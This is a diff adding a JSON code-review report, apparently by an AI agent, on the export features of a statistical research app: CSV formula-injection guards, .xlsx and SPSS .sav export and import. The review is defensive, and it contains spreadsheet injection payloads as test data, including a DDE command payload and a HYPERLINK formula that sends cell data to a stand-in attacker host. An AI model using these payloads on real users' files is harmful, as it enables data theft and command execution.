@@ -1,0 +1,566 @@
+{
+ "review": "verify-stage37-export",
+ "branch": "claude/stage37-export",
+ "reviewed_commit": "619143d",
+ "lenses_planned": [
+  "injection",
+  "sav",
+  "xlsx",
+  "integrity",
+  "integration"
+ ],
+ "lenses_completed": [
+  "injection",
+  "sav",
+  "xlsx",
+  "integrity",
+  "integration"
+ ],
+ "lenses_not_completed": [],
+ "fix_stage": "not run (paused before or at its start; no code changed)",
+ "results": {
+  "injection": {
+   "findings": [
+    {
+     "id": "F1-separator-split",
+     "area": "CSV exports: questionnaire responses (survey_storage), Data → Prepare (data_preparation), data export comma and semicolon layouts, bundle CSV",
+     "severity": "major",
+     "confirmed": true,
+     "claim": "The guard only looks at a text's first character. So a text that contains the other layout's separator before = + - @ is never neutralised, which bypasses the D8 guard in the app's main locales. Excel opens a .csv by splitting on the Windows list separator, which is ';' in Latvian and Russian settings, as the app's own semicolon-layout label says. An answer such as ok;=1+1;x then lands in its own cell `=1+1` and is evaluated. The survey and Prepare CSVs are always comma-separated and written by pandas with minimal quoting. They write that answer unquoted (r1,ok;=1+1;x,...), so any ';'-splitting reader gets the formula cell; this needs no assumption about quote parsing. The data-export layouts and the always-comma bundle CSV quote every text. They are still exposed when a reader treats a quote that does not open a field as literal: Python's csv module does, and Excel's well-known 'space before the quote' behaviour suggests Excel does too. OWASP: 'You also need to take care of the field separator (e.g., `,`, `;`)'.",
+     "evidence": "In-memory run of the branch code at 619143d:\n- csv_safety.protect('x;=1+1;y') returns it unchanged.\n- protect_frame + to_csv (survey_storage.py:589-590, data_preparation.py:243-244) writes the row `r1,x;=1+1;y,-1.5`. csv.reader(delimiter=';') on those bytes yields the cell '=1+1'.\n- de.write_csv, comma layout: `\"r1\",\"x;=1+1;y\",-1.5`; splitting on ';' yields '=1+1'.\n- Semicolon layout: `\"r2\";\"x,=2+2,y\";2`; splitting on ',' yields '=2+2'.\n- The bundle CSV is always comma (export_bundle.py:528). The semicolon layout is the default only when the UI language is lv or ru (workspace_export.py:94-95). The label at workspace_text.py:3378-3381 reads 'Semicolon (;) with a decimal comma: Excel set to Latvian or Russian'.\n- Not executed in a real Excel. LibreOffice was not run because it would create a profile.",
+     "file_line": "csv_safety.py:51-57; survey_storage.py:589-590; data_preparation.py:243-244; data_export.py:1002; export_bundle.py:528",
+     "red_test": "tests/test_stage37_csv_guard.py:\ndef test_no_formula_cell_when_split_on_the_other_separator(self):\n    df = pd.DataFrame({'id': ['r1', 'r2'], 'answer': ['ok;=1+1;x', 'ok,=2+2,x'], 'n': [1, 2]})\n    def bare(text, sep):\n        return [c for row in csv.reader(io.StringIO(text, newline=''), delimiter=sep) for c in row\n                if c[:1] in '=+-@' and not re.fullmatch(r'[-+]?\\d+([.,]\\d+)?', c)]\n    prot, _ = csv_safety.protect_frame(df)\n    self.assertEqual(bare(prot.to_csv(index=False), ';'), [])          # today ['=1+1']\n    for layout, other in (('comma', ';'), ('semicolon', ',')):\n        p = Path(self.tmp) / (layout + '.csv')\n        data_export.write_csv(p, df, bom=False, layout=layout)\n        self.assertEqual(bare(p.read_text('utf-8'), other), [])         # today ['=1+1'] / ['=2+2']"
+    },
+    {
+     "id": "F2-classic-survey-roundtrip",
+     "area": "Questionnaire responses CSV from the classic Survey panel (the default UI)",
+     "severity": "major",
+     "confirmed": true,
+     "claim": "The classic Survey panel's export writes the D8-protected CSV but writes its codebook without data_file. That codebook has no format marker and no SHA-256, so the program's importer never removes the apostrophes. Re-importing the researcher's own export silently changes every text answer that starts with = + - @, a tab or a carriage return: '-' becomes \"'-\", with no import warning. This contradicts docs/STAGE37_EXPORT.md:222: 'Their codebook or log records the file's SHA-256, so the program reads them back exactly.'",
+     "evidence": "- survey_ui.py:2555-2558 calls save_survey_codebook(root, sid, codebook_path) without data_file=output. save_survey_codebook then omits 'format' and 'data_file' (survey_storage.py:563-566), and csv_safety.exported_codebook skips such a book (csv_safety.py:93).\n- In-memory run of the real data_loader.load_dataset_with_report on bytes from protect_frame + to_csv, plus that codebook. Exported ['-', '+371 20000000', '@home'] and '-1 (disagree)' came back as [\"'-\", \"'+371 20000000\", \"'@home\"] and \"'-1 (disagree)\", with no warning. The same CSV with a data_file-bound codebook (the workspace path) restores exactly.\n- Reachability: research_app.main shows the classic UI and opens the workspace only with SRA_UI=workspace (research_app.py:3054-3060). survey_panel is mounted (research_app.py:2784, 2865) and its export button is wired (survey_ui.py:2737).\n- Tests only cover the workspace call with data_file= (tests/test_stage37_csv_guard.py:89-90).",
+     "file_line": "survey_ui.py:2555-2558",
+     "red_test": "def test_classic_survey_export_reads_back_exactly(self):\n    # the exact calls of survey_ui.export_responses\n    # submit answers '-', '+371 20000000', '@home' to a text question\n    out = save_survey_csv(root, sid, tmp / 'survey_responses.csv')\n    save_survey_codebook(root, sid, out.with_name(out.stem + '_codebook.json'))\n    frame, _ = data_loader.load_dataset_with_report(out)\n    self.assertEqual(frame[key].tolist(), ['-', '+371 20000000', '@home'])\n    # today: [\"'-\", \"'+371 20000000\", \"'@home\"]\nBetter: put both UIs on one survey_storage helper that writes the CSV and a bound codebook, test that helper, and test that survey_ui uses it."
+    },
+    {
+     "id": "F3-owasp-trigger-set",
+     "area": "csv_safety trigger set, used by every CSV writer",
+     "severity": "minor",
+     "confirmed": true,
+     "claim": "csv_safety's trigger set is older than the OWASP guidance the module cites. Text and header cells that start with a line feed (0x0A) or with full-width ＝ ＋ － ＠ are written unprotected by every CSV writer.",
+     "evidence": "- In memory, protect() returns '\\n=1+1', '＝1+1', '＋1', '－1' and '＠SUM(A1)' unchanged.\n- de.write_csv leaves the header '\\n@hdr' and the cells '\\n=1+1', '＝1+1' and '－1' unprotected in both layouts; protect_frame does the same.\n- OWASP CSV Injection (community.owasp.org/attacks/CSV_Injection, fetched during this review) lists 'Line feed (0x0A)' and 'Full-width (double-byte) variants … ＝, ＋, －, ＠'. The code has TRIGGERS = ('=', '+', '-', '@', '\\t', '\\r').\n- Not shown here: that a real spreadsheet evaluates these. Full-width mostly matters for Chinese/Japanese/Korean-language Excel.\n- Fix notes: adding them needs a new rule version, because restore must not strip the apostrophe from an old file's own \"'\\n…\" text. The R unprotect regex (export_bundle.py:358) and the codebook description (data_export.py:1491-1494) need the same change.",
+     "file_line": "csv_safety.py:39, 48",
+     "red_test": "for t in ('\\n=1+1', '＝1+1', '＋1', '－1', '＠SUM(A1)'):\n    self.assertNotEqual(csv_safety.protect(t), t)        # today equal\n    self.assertEqual(csv_safety.restore(csv_safety.protect(t)), t)"
+    },
+    {
+     "id": "F4-forged-codebook",
+     "area": "Re-import apostrophe strip: SHA-256 binding",
+     "severity": "minor",
+     "confirmed": true,
+     "claim": "The SHA-256 binding is not authentication. Anyone who supplies a CSV plus a <name>_codebook.json carrying that CSV's SHA-256 triggers the apostrophe strip, and the import report then says the file 'was exported by Statistical Research Assistant', which is false. There is no escalation: the stripped texts are what a plain CSV could carry anyway, and every export path protects them again.",
+     "evidence": "In-memory run of the real load_dataset_with_report on an attacker CSV and a forged codebook:\n- Warning: 'Formula protection removed from 6 text cell(s): this CSV was exported by Statistical Research Assistant and the file written with it (attack_codebook.json) matches it.'\n- Values came back as '=HYPERLINK(\"http://evil.invalid/?\"&A1,\"click\")', '@a', '-5' and header '=HDR()'. The forged label '=LABEL()' and value label '=VL()' were imported as metadata.\n- Re-export: the CSV writes `\"'=HYPERLINK(\"\"http://evil.invalid/?\"\"&A1,\"\"click\"\")\"` and header `\"'=HDR()\"`; the .xlsx Data and Codebook sheets contain 0 <f> elements.",
+     "file_line": "csv_safety.py:79-104; data_loader.py:267-273",
+     "red_test": "Write attack.csv and attack_codebook.json = {format: CODEBOOK_FORMAT, data_file: {sha256: sha256(attack.csv bytes), formula_protection: {rule: RULE}}}.\nframe, report = load_dataset_with_report(attack.csv)\nself.assertFalse(any('exported by Statistical Research Assistant' in w for w in report.warnings))   # fails today\nThe fix is the wording (for example 'the codebook next to it vouches for this exact file'): without a secret, the binding cannot prove authorship."
+    },
+    {
+     "id": "F5-bundle-csv-restore",
+     "area": "Reproducibility bundle: data/<stem>.csv round trip",
+     "severity": "minor",
+     "confirmed": true,
+     "claim": "The bundle stores its codebook at codebook/codebook.json, but the importer only looks for data/<stem>_codebook.json next to the CSV. Importing the bundle's own data/<stem>.csv back into the program therefore keeps the protective apostrophes.",
+     "evidence": "In-memory run of the real loader on the bundle layout: de.write_csv (comma, no byte-order mark) at data/study.csv, and a codebook with data_file at codebook/codebook.json.\n- csv_safety.codebook_path points at /vfs/bundle/data/study_codebook.json.\n- Re-imported group [\"'-\", \"'+\", 'ctrl'] and note [\"'@home\", \"'=x\", 'ok']; exported were ['-', '+', 'ctrl'] and ['@home', '=x', 'ok']. Numbers unchanged.",
+     "file_line": "export_bundle.py:528-552; csv_safety.py:65-68, 86",
+     "red_test": "write_bundle(tmp/'b.zip', df=frame with texts '-', '+', '@home', '=x', codebook=cb, entries=[])\nzipfile.ZipFile(tmp/'b.zip').extractall(tmp/'b')\nframe, _ = load_dataset_with_report(tmp/'b'/'data'/(stem + '.csv'))\nself.assertEqual(frame['note'].tolist(), ['-', '+', '@home', '=x'])   # today apostrophe-prefixed\nFix: also write data/<stem>_codebook.json, or let exported_codebook find ../codebook/codebook.json when a bundle manifest is present."
+    },
+    {
+     "id": "F6-r-syntax-names",
+     "area": "Bundle R syntax (syntax/R<n>_<method>.R)",
+     "severity": "minor",
+     "confirmed": true,
+     "claim": "The R scripts read columns by their unprotected names, but the bundle CSV header protects names that start with = + - @, a tab or a carriage return. With read.csv(check.names = FALSE) the column is called \"'-x\", so d[[\"-x\"]] is NULL. The 'verified' script then fails for any analysed variable whose name starts with one of those characters; the Welch and ANOVA scripts have the same problem with group and outcome.",
+     "evidence": "- In memory, the bundle-style CSV header is `\"'-x\",\"'+y\",\"t\",\"z\"`.\n- r_syntax for Pearson on '-x' and '+y' emits `x <- d[[\"-x\"]]` and `y <- d[[\"+y\"]]`.\n- 'names(d)' never appears in the script, and unprotect is only applied to group values (export_bundle.py:428, 439).\n- Not executed in R, because Rscript would create a temp directory.",
+     "file_line": "export_bundle.py:355-358, 389; data_export.py:1004",
+     "red_test": "script, _, _ = export_bundle.r_syntax(1, pearson_entry('-x', '+y'), df, 'd.csv', 'v')\nheader = next(csv.reader(open(bundle_csv, encoding='utf-8')))\nused = re.findall(r'd\\[\\[\"([^\"]*)\"\\]\\]', script)\nself.assertTrue(set(used) <= set(header) or 'names(d) <- unprotect(names(d))' in script)\n# today {'-x', '+y'} vs [\"'-x\", \"'+y\", ...]\nAlternatively run the script with skipUnless(Rscript) and expect exit code 0."
+    },
+    {
+     "id": "F7-bare-minus-inf",
+     "area": "CSV export: non-finite numbers",
+     "severity": "minor",
+     "confirmed": true,
+     "claim": "write_csv writes a non-finite number unquoted as -inf (or inf). Spreadsheets read a bare cell starting with '-' that is not a number as a formula, so Excel shows #NAME?, and saving from Excel loses the value. The .xlsx writer already stores ±inf as text cells.",
+     "evidence": "- In-memory write_csv gives the comma-layout row `1,2,\"\",-inf`; the semicolon layout also writes `-inf`.\n- A raw scan for unquoted fields that start with a trigger finds ['-0.0', '-1.5', '-2.5', '-3', '-5', '-inf']; only '-inf' is not a number.\n- csv_cell returns float('-inf') (data_export.py:970-974), while _CellWriter writes it as text (data_export.py:1089-1093).\n- The text '-inf' is never parsed as a number on import (data_loader._numeric_value), so the value comes from a .sav double or a derived variable.\n- Excel's #NAME? is known behaviour and was not run here.",
+     "file_line": "data_export.py:963-975",
+     "red_test": "de.write_csv(p, pd.DataFrame({'z': [float('-inf'), 1.0]}), bom=False)\nunquoted = [f for f, quoted in raw_fields(p.read_text()) if not quoted]\nself.assertFalse([f for f in unquoted if f[:1] in '-+'\n                  and not re.fullmatch(r'[-+]?\\d+(\\.\\d+)?([eE][-+]?\\d+)?', f)])   # today ['-inf']"
+    },
+    {
+     "id": "F8-xlsx-silent-cut",
+     "area": ".xlsx export: very long strings and control characters",
+     "severity": "minor",
+     "confirmed": true,
+     "claim": "The .xlsx export changes data without telling the researcher. It cuts texts longer than 32,767 characters, replaces control characters with U+FFFD, and writes integers above 2^53 and ±inf as text. It counts these in facts['cut'], facts['cleaned'] and facts['text_numbers'], but no caller reads them, so the researcher only sees 'Saved and checked … N rows, M variables'. The .sav export, by contrast, previews every cut or converted field before saving.",
+     "evidence": "- In-memory write_xlsx with a 40,000-character cell gave facts {'cut': 1, 'cleaned': 0, 'text_numbers': 6}; the cell read back has length 32767.\n- grep: 'cut', 'cleaned' and 'text_numbers' are read nowhere outside data_export.py (lines 1173 and 1210-1213).\n- workspace_export._announce (lines 423-444) uses only path, rows, columns and signature.\n- docs/STAGE37_EXPORT.md:60 says 'cut (the Excel limit), counted'.",
+     "file_line": "data_export.py:1063-1072, 1210-1213; workspace_export.py:423-444",
+     "red_test": "card._facts = de.export_xlsx(p, pd.DataFrame({'t': ['x' * 40000, 'a\\x0bb']}), book, sections=('data',))\nmsg = card._announce(p)\nself.assertRegex(msg, r'32[ ,.]?767|cut|shorten')\n# today: 'Saved and checked: … 2 rows, 1 variables (xlsx (zip))'"
+    }
+   ],
+   "checked_and_fine": [
+    "How this was run: the requested worktree /tmp/verify-export-injection was not created, because this agent may not create files anywhere, including /tmp. The existing clean worktree /home/user/statistical-research-assistant/.claude/worktrees/agent-ab4c1a5c434f3d69a, at 619143d (= claim/stage37-export), was used read-only. The branch code ran in-process via python -c with PYTHONDONTWRITEBYTECODE=1 and a guard that blocks every filesystem write, temporary file, rename and unlink. Output went only to anonymous memfd buffers, and the importer tests used an in-memory file overlay. Afterwards git status is clean, no new files exist in the worktree, and nothing under /tmp/verify-export-injection* exists, so there was nothing to remove. LibreOffice and Rscript are installed but were not run, since both create profile or temp directories; there is no real Excel here.",
+    ".xlsx: hostile values went into Data cells and headers, the Codebook sheet (labels, value labels, missing codes, history kinds, parameters, outputs and datasets), the Scales sheet (scale ids, rules), a Results-style sheet built with export_bundle.analysis_rows, and the Provenance sheet (provenance_rows + provenance_table with JSON options, roles and levels). Result: 0 <f> elements, no sharedStrings part, and cell types only inlineStr (313), n (86) and b (15). '#N/A' and a lone '=' are written as inlineStr. There are no hyperlinks, comments or external links; the only match is an empty <definedNames/>. _CellWriter.text forces data_type 's' (data_export.py:1063-1072), and every value of every sheet passes through it, so no raw string ever reaches openpyxl's formula detection.",
+    "Sheet names derived from titles are cleaned by _sheet_title and never evaluated ('R1 =HYPERLINK(\"http___x\")').",
+    "csv_safety protect/restore: '=', '+', '-', '@', tab, CR, the DDE payload =cmd|' /C calc'!A0, HYPERLINK, the text '-5' and '+37120000000' all get exactly one apostrophe. \"'=1+1\" becomes \"''=1+1\"; \"'quoted'\" is unchanged; restore(protect(t)) == t for every payload tried.",
+    "Numbers in CSV: written unquoted with every digit Python needs (0.30000000000000004, -1.5, 1e16, -0.0). read_exported_csv returns them exactly in both layouts; the decimal comma comes from _CommaNumber. Numbers in mixed object columns are never protected, and protect_frame skips numeric dtypes. In .xlsx, doubles that need 17 significant digits are rounded to 16 (openpyxl writes '%.16g': 0.30000000000000004 becomes <v>0.3</v>). That is documented in docs/STAGE37_EXPORT.md:360, so it is not reported.",
+    "CSV quoting in data_export: every text is quoted (csv.QUOTE_STRINGS); an empty text is \"\" and a missing value is an unquoted empty field; booleans are unquoted. Header names are protected by both writers. A separator inside a text is always quoted for the layout's own separator.",
+    "protect_frame under pandas 3.1.1 (the locked version): str, string, category and mixed object columns are protected; numeric columns are untouched.",
+    "Hash-binding mechanics: the sidecar must sit in the same folder as <stem>_codebook.json or <stem>_steps.json, with the exact format marker, rule and SHA-256 of the CSV bytes. Sidecars are capped at 50 MB, malformed JSON is ignored, and an edited CSV keeps its apostrophes. A forged pair is accepted (finding F4), but re-export protects the texts again (CSV apostrophe, xlsx 0 <f>). Codebook or .sav metadata only ends up in text cells, .sav labels and JSON.",
+    "R syntax: _r_string escapes backslash, double quote, LF, CR and tab (export_bundle.py:341-344). Regression refuses names containing a backtick or backslash (403-406). Numeric group levels are emitted only through number_text. The unprotect regex matches csv_safety.restore. In the header comment only LF is replaced (385), so a CR could end the comment under source(); this is unreachable today because the four verified methods use constant titles (analysis_runs.py:326, 379, 412, 503). It is a hardening note only.",
+    "Bundle: member names come from _safe_stem ([\\w-] only) or constants, so there is no path traversal. The CSV, data .xlsx and results.xlsx members use the same guarded writers (export_bundle.py:528-559). manifest.json and codebook.json are JSON and not evaluated by spreadsheets.",
+    "The Export card routes every format through de.export_xlsx, de.export_csv, de.export_sav, export_bundle.export_results and write_bundle (workspace_export.py:360-400). The workspace Survey export passes data_file=, and write_verified hands the writer the final path, so that codebook binds (workspace_questionnaires.py:739-741, workspace_files.py:50-66). The Prepare log (_steps.json with data_file) also binds.",
+    "Other writers: the classic research_app.py exports are TXT, PNG and DOCX only. The remaining to_csv calls (project_store.py:124/1439, chart_views.py:49, workspace_state.py:303, project_session.py:564, ai_context.py:271) are hashing, internal storage or an AI preview, not user exports. There is no TSV or table clipboard export; the clipboard holds report text or a PNG.",
+    "Word reports: user text goes in as python-docx text runs, and the only field is a constant PAGE field (report_docx.py:161-172), so no field injection is possible.",
+    "Chart SVG is produced by matplotlib, and the added <desc> is escaped (chart_studio.py:2752-2761).",
+    "Not reported because OWASP does not list them: a leading space, non-breaking space, zero-width space or byte-order mark before '=', and '|' or '%' prefixes. OWASP also notes that apostrophe protection can be lost after an Excel save and reopen; that is inherent to the OWASP method."
+   ]
+  },
+  "sav": {
+   "findings": [
+    {
+     "id": "SAV-1",
+     "severity": "major",
+     "area": ".sav export: string user-missing values vs written variable width",
+     "claim": "A string user-missing code longer than the variable's written width is still declared as an 8-byte missing value. PSPP reads only MIN(width, 8) bytes of it, so a valid answer becomes user-missing: 'N/A' declared on an A1 variable makes every 'N' missing. The default import reaches this: user-missing becomes missing, the code values are removed, and pyreadstat then sizes the variable from the remaining data. Documented codes that are absent from the data reach it too. Nothing is listed in the preview, and the pyreadstat-based verification passes.",
+     "evidence": "External .sav: SMOKER A3, missing 'N/A', values Y,N,N/A,Y,N. The app's _load_sav with default options gives ['Y','N',nan,'Y','N'] and metadata missing_codes ['N/A']. plan_sav changes for smoker: []. The exported type-2 record is SMOKER, width 1, n_missing 2, values [b'N/A     ', b'        ']; the first min(width,8)=1 byte is b'N'. pyreadstat compares full strings, so after re-read with missing applied it still reports ['Y','N',nan,'Y','N'] (verification is blind to this). PSPP sys-file-reader.c: `mv_add_str (&mv, rec->missing + 8 * i, MIN (width, 8));`. missing-values.c mv_add_str copies len bytes, padded to the variable width.",
+     "file_line": "data_export.py:764-771 (_sav_missing text branch checks only <=8 bytes, not the column's byte width); data_export.py:940 (pyreadstat derives width from data only); data_loader.py:693-694",
+     "confirmed": true,
+     "red_test": "def test_string_missing_codes_fit_the_written_width(self):\n    df = pd.DataFrame({'smoker': ['Y', 'N', 'Y', None]})\n    book = de.build_codebook(df, 't', metadata={'smoker': {'missing_codes': ['N/A'], 'source': 'sav'}})\n    path = self.folder / 'm.sav'; de.export_sav(path, df, book)\n    width, missing = own_type2_records(path.read_bytes())['SMOKER']  # independent struct parser: (type field, list of 8-byte missing values)\n    for value in missing:\n        self.assertEqual(value[width:].strip(b' '), b'')  # today width=1 and b'/A' is left over -> FAILS"
+    },
+    {
+     "id": "SAV-2",
+     "severity": "major",
+     "area": ".sav export: 8-byte short names in type-2 records",
+     "claim": "spss_names makes long names unique ignoring case. ReadStat, however, derives each short name from the first 8 bytes or fewer and uppercases only ASCII letters. For Latvian or Russian names that differ only in the case of a non-ASCII letter within those bytes, the file therefore holds case-insensitively duplicate variable names. SPSS and PSPP names are case-insensitive. PSPP gives the second variable a generated name (with a warning), and its long-name entry then refers to an unknown variable, so the exported variable loses its name.",
+     "evidence": "App export of ['Возраст','возраст_группа'] gives type-2 names ['Возр','возр']; uppercased, both are 'ВОЗР'. Fuzz (300 random name sets through spss_names, then write_sav, then an independent parse): 13 files had such duplicates, e.g. 'Ēdiens_1'/'ēdiens_22' became 'ĒDIENS_'/'ēDIENS_'. pyreadstat matches names byte-wise, so verify_sav passes. In PSPP dictionary.c, dict_lookup_var uses utf8_hash_case_string and utf8_strcasecmp, and dict_create_var returns NULL for a case-insensitive duplicate. sys-file-reader.c then calls `add_var_with_generated_name` and warns \"Renaming variable with duplicate name\". The long-name map looks names up with the same case-insensitive dict_lookup_var.",
+     "file_line": "data_export.py:653-678 (only long names checked); data_export.py:940",
+     "confirmed": true,
+     "red_test": "def test_short_names_are_unique_ignoring_case(self):\n    for cols in (['Возраст', 'возраст_группа'], ['Ēdiens_1', 'ēdiens_2']):\n        df = pd.DataFrame({c: [1.0, 2.0] for c in cols})\n        path = self.folder / 'n.sav'; de.export_sav(path, df, de.build_codebook(df, 't'))\n        shorts = own_short_names(path.read_bytes())  # type-2 name fields, continuation records skipped\n        self.assertEqual(len({s.casefold() for s in shorts}), len(shorts), shorts)  # today ['Возр','возр'] -> FAILS"
+    },
+    {
+     "id": "SAV-3",
+     "severity": "major",
+     "area": ".sav import: windows-1251 files",
+     "claim": "pyreadstat 1.3.7 (ReadStat) rejects any .sav whose long-variable-names record (subtype 13) contains byte 0xFF. In windows-1251 that byte is 'я'. A legacy Russian SPSS file with a single variable named, say, 'имя', 'семья' or 'моя_оценка' cannot be opened; the app reports 'The SPSS file could not be read: Invalid file, or file has unsupported features'. pyreadstat's encoding override does not help, and the app has no fallback.",
+     "evidence": "Hand-built, spec-conformant files that differ only in the long name. cp1251 'имен', 'возраст', 'пол': OK. 'имя', 'моя_оценка', 'яблоко', 'семья': FAIL. A cp1257 name containing 0xFF ('˙'): FAIL. The same name 'имя' in UTF-8: OK. A variable label containing 0xFF ('Моя оценка'): OK. read_sav(encoding='WINDOWS-1251'): FAIL. The app's _load_sav(..., ImportOptions(encoding='cp1251')) raises ValueError. Byte 0xFF in the subtype 13 record is the only difference.",
+     "file_line": "data_loader.py:650-652",
+     "confirmed": true,
+     "red_test": "def test_cp1251_name_with_ya_imports(self):\n    # minimal file: 176-byte header ($FL2, 1 slot, 1 case), type-2 numeric 'V1', 7/3 (char code 1251), 7/4, 7/11, 7/13 b'V1=' + 'имя'.encode('cp1251'), 7/20 b'windows-1251', 999, data 1.0\n    path = self.folder / 'ru.sav'; path.write_bytes(minimal_sav(long_name='имя', codepage=1251, encoding=b'windows-1251'))\n    frame, _ = load_dataset_with_report(path)  # today: ValueError 'Invalid file, or file has unsupported features'\n    self.assertEqual(list(frame.columns), ['имя'])"
+    },
+    {
+     "id": "SAV-4",
+     "severity": "minor",
+     "area": ".sav import option semantics: Encoding",
+     "claim": "For a .sav source the Data page still offers the Encoding dropdown (along with the separator, decimal and missing-token fields), and _reimport passes the choice in ImportOptions. _load_sav, however, uses only user_missing and never options.encoding. A file whose declared code page is wrong imports as mojibake without any warning, and choosing cp1257 changes nothing, even though pyreadstat.read_sav(encoding=...) would decode it.",
+     "evidence": "File declaring code page 1252 (no subtype 20) with cp1257 bytes: ImportOptions(encoding='auto') and ImportOptions(encoding='cp1257') both give column 'vârds', values 'Jânis Bçrziòð', 'Lîga', 'Çriks' and report.encoding 'WINDOWS-1252'. pyreadstat.read_sav(path, encoding='WINDOWS-1257') gives 'vārds' and 'Jānis Bērziņš'.",
+     "file_line": "data_loader.py:641-650; workspace_shell.py:1185-1202 and 1247-1255",
+     "confirmed": true,
+     "red_test": "def test_sav_encoding_option_is_applied(self):\n    path = self.folder / 'lv.sav'; path.write_bytes(minimal_sav(long_name='vārds', codepage=1252, text_encoding='cp1257', values=['Jānis Bērziņš']))\n    frame, _ = load_dataset_with_report(path, ImportOptions(encoding='cp1257'))\n    self.assertIn('vārds', frame.columns)  # today 'vârds' -> FAILS (alternatively: the option must not be offered for .sav)"
+    },
+    {
+     "id": "SAV-5",
+     "severity": "minor",
+     "area": ".sav export: strings longer than SPSS's 32,767-byte maximum",
+     "claim": "Text longer than 32,767 bytes is written as is: a very-long-string record 'ESSAY=40000' over 159 segments, with no preview entry. The docs say strings are carried 'with any width'. PSPP (MAX_STRING 32767) skips that very-long-string entry with a warning, so the file opens as 159 separate 255-byte variables with the text chopped across them. SPSS cannot hold such a string either. pyreadstat reads it back, so verification passes. The .xlsx path, by contrast, already cuts at 32,767 characters and lists the cut.",
+     "evidence": "df essay = ['a'*40000, 'b']: plan changes []; 159 type-2 segments (ESSAY, ESSAY0, ESSAY1 …, each A255); subtype 14 is [b'ESSAY=40000\\x00\\t']; app verify returns OK with 2 rows. PSPP parse_long_string_map: `if (length < 1 || length > MAX_STRING) { sys_warn (... \"invalid length\"); continue; }`; val-type.h: `#define MAX_STRING 32767`.",
+     "file_line": "data_export.py:795-866 (no width check in plan_sav); docs/STAGE37_EXPORT.md:84",
+     "confirmed": true,
+     "red_test": "def test_text_over_32767_bytes_is_cut_and_listed(self):\n    df = pd.DataFrame({'essay': ['a' * 40000, 'b']}); book = de.build_codebook(df, 't')\n    plan = de.plan_sav(df, book)\n    self.assertTrue(any(name == 'essay' for name, _, _ in plan.changes))  # today [] -> FAILS\n    path = self.folder / 'e.sav'; de.export_sav(path, df, book, plan=plan)\n    self.assertTrue(all(w <= 32767 for w in own_very_long_string_widths(path.read_bytes())))"
+    },
+    {
+     "id": "SAV-6",
+     "severity": "minor",
+     "area": ".sav export: string value-label codes wider than the computed width",
+     "claim": "pyreadstat sizes a string variable from the UTF-8 byte length of the data but only from the character count of value-label codes, so a multibyte code that does not occur in the data may not fit. On short strings the label is keyed on a truncated code: PSPP does memcpy(value.s, label->value, width), so 'Нет' becomes 'Не'. On long strings the whole export aborts with a ReadStat error. plan_sav predicts neither case.",
+     "evidence": "Data ['Да','Да',None] with labels {'Да','Нет'}: width 4, and the type-3 value for 'Нет' is b'\\xd0\\x9d\\xd0\\xb5\\xd1\\x82  ', whose first 4 bytes are 'Не'. Data ['a'*11, 'b'] with label code 'Ж'*8 (16 bytes): export fails with ReadstatError 'A provided string value was longer than the available storage size of the specified column'. plan changes [] in both cases. The pyreadstat writer computes `curlen = len(str(lab))` for label keys. PSPP parse_one_value_label_set: `memcpy (value.s, label->value, width);`.",
+     "file_line": "data_export.py:835-841 (string codes passed through; only the label text is cut); data_export.py:940",
+     "confirmed": true,
+     "red_test": "def test_string_label_codes_fit_or_are_listed(self):\n    df = pd.DataFrame({'ans': ['Да', 'Да', None]})\n    book = de.build_codebook(df, 't', metadata={'ans': {'value_labels': {'Да': 'согласен', 'Нет': 'не согласен'}}})\n    path = self.folder / 'v.sav'; de.export_sav(path, df, book)\n    width, codes = own_short_string_label_values(path.read_bytes(), 'ANS')\n    self.assertEqual({c[:width].decode().rstrip() for c in codes}, {'Да', 'Нет'})  # today {'Да','Не'} -> FAILS"
+    },
+    {
+     "id": "SAV-7",
+     "severity": "minor",
+     "area": ".sav export: durations",
+     "claim": "A timedelta column (kind 'duration') is written as an A15 string such as '1 days 02:00:00', so it is no longer numeric in SPSS, and plan_sav lists nothing. This contradicts 'Every renamed, cut or converted field is listed before saving' and the docs' conversion list. Such columns can reach the exporter: for Excel [h]:mm:ss cells, pandas/openpyxl read_excel(dtype=object), which the loader uses, returns datetime.timedelta.",
+     "evidence": "df d = to_timedelta(['1 days 02:00:00','0:15:30',None,'3:00:00']): plan changes []; type-2 record ('D', width 15, A15.0); pyreadstat re-read gives ['1 days 02:00:00','0 days 00:15:30',nan,...]. An in-memory workbook with [h]:mm:ss cells read through pd.read_excel(header=None, dtype=object) gives ['timedelta','timedelta'].",
+     "file_line": "data_export.py:843 and 890 (duration handled as text); data_export.py:26 (the claim)",
+     "confirmed": true,
+     "red_test": "def test_durations_are_numeric_or_listed(self):\n    df = pd.DataFrame({'d': pd.to_timedelta(['1 days 02:00:00', '0:15:30', None])})\n    plan = de.plan_sav(df, de.build_codebook(df, 't'))\n    self.assertTrue(any(name == 'd' for name, _, _ in plan.changes) or plan.columns[0].kind not in ('duration', 'text'))  # today FAILS"
+    },
+    {
+     "id": "SAV-8",
+     "severity": "minor",
+     "area": ".sav round trip: original names restored from the notes",
+     "claim": "The CSV/XLSX loader rejects only exact duplicate headers, so 'q1' and 'Q1' can coexist. On export, 'Q1' is renamed 'Q1_2'. On re-import, _load_sav finds a case-insensitive clash among the restored names and keeps the SPSS names for every column, so all other renamed columns (for example long LV/RU names cut to 64 bytes) also lose their originals. The docs say 'The program's importer reads the notes and gives the original names back.'",
+     "evidence": "Fuzz case: columns [<70-character name>, 'q1', 'Q1', 'тбНDxРāбю7Э'] were re-imported as [<64-byte SPSS name>, 'q1', 'Q1_2', 'тбНDxРāбю7Э'] with the warning 'original variable names in the file's notes clash; the SPSS names were kept'. data_loader.py:463-469 rejects only exact duplicates.",
+     "file_line": "data_loader.py:658-666",
+     "confirmed": true,
+     "red_test": "def test_names_restored_when_originals_differ_only_by_case(self):\n    cols = ['q1', 'Q1', LV_NAME]\n    df = pd.DataFrame({c: [1.0, 2.0] for c in cols}); path = self.folder / 'c.sav'\n    de.export_sav(path, df, de.build_codebook(df, 't'))\n    frame, _ = load_dataset_with_report(path)\n    self.assertEqual(list(frame.columns), cols)  # today ['q1','Q1_2', <SPSS name>] -> FAILS"
+    },
+    {
+     "id": "SAV-9",
+     "severity": "minor",
+     "area": "codebook JSON after .sav import (LO/HI missing ranges)",
+     "claim": "SPSS 'LO THRU x' and 'x THRU HI' ranges arrive from pyreadstat as -inf/+inf. VariableEntry.to_dict passes them through unconverted, and json.dumps (allow_nan default) writes -Infinity/Infinity into <name>_codebook.json and the bundle's codebook/codebook.json. That is not valid JSON (RFC 8259), and strict parsers reject the file. The .sav itself is correct: pyreadstat writes the exact LOWEST/HIGHEST bits back.",
